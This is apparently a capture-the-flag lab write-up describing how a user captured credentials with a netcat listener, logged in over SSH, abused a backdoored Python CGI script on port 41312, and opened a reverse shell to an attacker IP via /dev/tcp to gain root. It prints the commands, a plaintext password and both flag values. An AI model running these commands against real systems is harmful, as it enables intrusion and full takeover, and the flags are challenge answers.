Project Goal
The goal of this project was to investigate a vulnerable CGI server within a local network, identify a remote command execution (RCE) vulnerability, and gain control over the system through a reverse shell. The final objective was to escalate privileges and capture the root flag.

Execution Steps
1. Traffic Analysis
First, I launched Netcat on my machine (IP 10.10.189.64) to monitor incoming data:

nc -lvnp 9000
Shortly after, I received a POST request containing credentials:

jack:WhyIsMyPasswordSoStrongIDK
2.SSH Access
I then established an SSH connection to the target machine (10.10.131.187) as the user jack:

ssh jack@10.10.131.187
# Entered password: WhyIsMyPasswordSoStrongIDK
On the target system, I retrieved the user flag:

cat ~/user.txt
1ca4eb201787acbfcf9e70fca87b866a
3. Discovering the CGI Backdoor
I noticed an active service on port 41312:

ss -tulnp
It was serving a CGI script at /cgi-bin/5UP3r53Cr37.py and accepted the parameters key, iv, and cmd.


curl -k "https://127.0.0.1:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id"
4.  Gaining Root Shell Access
To initiate a reverse shell, I set up a Netcat listener on my machine:

nc -lvnp 4444
Then, I triggered the reverse shell from the target:

curl -k "https://127.0.0.1:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sh%20-c%20'sh%20-i%20>%26%20/dev/tcp/10.10.189.64/4444%200>%261'"
I successfully received a root shell on my machine 

5. Capturing the Root Flag
Once I had root-level access, I located and read the root flag:

cat /root/root.txt
4dbe2259ae53846441cc2479b5475c72

Conclusion

I conducted a complete penetration test of a remote server, identifying and exploiting an RCE vulnerability via an insecure CGI script. Using extracted credentials and traffic analysis, I gained full root access and successfully captured the root flag.

The main attack vector was a vulnerable Python CGI script that executed unsanitized commands directly in the system shell.
